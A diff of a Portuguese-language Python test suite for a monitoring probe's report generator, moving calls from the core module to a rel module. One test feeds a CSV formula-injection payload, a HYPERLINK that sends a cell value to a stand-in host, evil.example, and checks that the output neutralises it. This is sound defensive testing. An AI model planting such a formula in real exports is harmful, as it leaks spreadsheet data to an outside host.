@@ -17,7 +17,7 @@ import unittest
 from datetime import datetime, timedelta
 from pathlib import Path
 
-from test_sonda import Base, cfg_rodada, core
+from test_sonda import Base, cfg_rodada, core, rel
 
 
 def esperar(cond, segundos=5.0):
@@ -364,7 +364,7 @@ class TestRelatorioRobusto(Base):
 
     def test_csv_nao_carrega_formula_do_corpo_da_resposta(self):
         self.gravar_falhas('=HYPERLINK("http://evil.example/?"&A1,"x")')
-        out = core.gerar_relatorio(self.pasta, 1)
+        out = rel.gerar_relatorio(self.pasta, 1)
         celulas = []
         for arq in out.glob("*.csv"):
             for linha in arq.read_text(encoding="utf-8-sig").splitlines():
@@ -374,7 +374,7 @@ class TestRelatorioRobusto(Base):
 
     def test_cobertura_comeca_no_primeiro_registro(self):
         agora = self.gravar_falhas("x")
-        out = core.gerar_relatorio(self.pasta, 7)
+        out = rel.gerar_relatorio(self.pasta, 7)
         linhas = (out / "4_cobertura_diaria.csv").read_text(encoding="utf-8-sig").splitlines()[1:]
         self.assertEqual(len(linhas), 1)  # não inventa "cobertura 0%" para os 6 dias em que a sonda não existia
         self.assertTrue(linhas[0].startswith(agora.astimezone().strftime("%d/%m/%Y")))
@@ -384,19 +384,19 @@ class TestRelatorioRobusto(Base):
         arq = next((self.pasta / "logs").glob("sonda-*.jsonl"))
         with open(arq, "ab") as f:
             f.write(b"\xff\xfe nao e json\n")
-        html_ = (core.gerar_relatorio(self.pasta, 1) / "resumo_para_chamado.html").read_text(encoding="utf-8")
+        html_ = (rel.gerar_relatorio(self.pasta, 1) / "resumo_para_chamado.html").read_text(encoding="utf-8")
         self.assertIn("1 linha(s) do log estavam ilegíveis", html_)
 
     def test_relatorio_e_publicado_por_inteiro_e_sem_sobras(self):
         self.gravar_falhas("x")
-        out = core.gerar_relatorio(self.pasta, 1)
+        out = rel.gerar_relatorio(self.pasta, 1)
         pai = out.parent
         self.assertEqual(sorted(p.name for p in pai.iterdir()), [out.name])  # sem .novo nem .velha
         self.assertEqual(len(list(out.iterdir())), 6)
 
     def test_pasta_do_dia_travada_gera_outra_completa_em_vez_de_misturar(self):
         self.gravar_falhas("x")
-        primeiro = core.gerar_relatorio(self.pasta, 1)
+        primeiro = rel.gerar_relatorio(self.pasta, 1)
         marca = primeiro / "3_ocorrencias.csv"
         antes = marca.read_bytes()
         original = os.replace
@@ -407,7 +407,7 @@ class TestRelatorioRobusto(Base):
             return original(src, dst)
         os.replace = travada
         try:
-            segundo = core.gerar_relatorio(self.pasta, 1)
+            segundo = rel.gerar_relatorio(self.pasta, 1)
         finally:
             os.replace = original
         self.assertNotEqual(segundo, primeiro)  # fica numa pasta com a hora no nome
@@ -421,15 +421,15 @@ class TestRelatorioRobusto(Base):
         sondas = [{"alvo": "portal", "tentativa": 1, "resultado": "ok", "total_ms": 300,
                    "ts_utc": (agora + timedelta(seconds=336 * i)).isoformat().replace("+00:00", "Z")} for i in range(120)]
         alvos = [{"id": "portal", "nome": "Portal", "tipo": "portal"}]
-        html_ = core._grafico(sondas, alvos, cfg_rodada())
+        html_ = rel._grafico(sondas, alvos, cfg_rodada())
         self.assertEqual(html_.count("<rect x="), 120 + 0)  # exatamente uma barra por medição (a legenda usa <rect w=)
         self.assertIn("1 barra = 1 medição", html_)
 
     def test_registro_ausente_tem_cor_propria_e_nao_entra_na_latencia(self):
-        self.assertEqual(core._cor_da_medicao("registro_ausente"), "ausente")
-        b = core._baldes([(0, "registro_ausente", 180)], 0, 300, 30)
+        self.assertEqual(rel._cor_da_medicao("registro_ausente"), "ausente")
+        b = rel._baldes([(0, "registro_ausente", 180)], 0, 300, 30)
         self.assertEqual(b[0][0], "ausente")
-        b = core._baldes([(0, "registro_ausente", 9000), (1, "ok", 500)], 0, 300, 30)
+        b = rel._baldes([(0, "registro_ausente", 9000), (1, "ok", 500)], 0, 300, 30)
         self.assertEqual(b[0][1], 0.5)  # só a resposta válida conta na latência
 
 
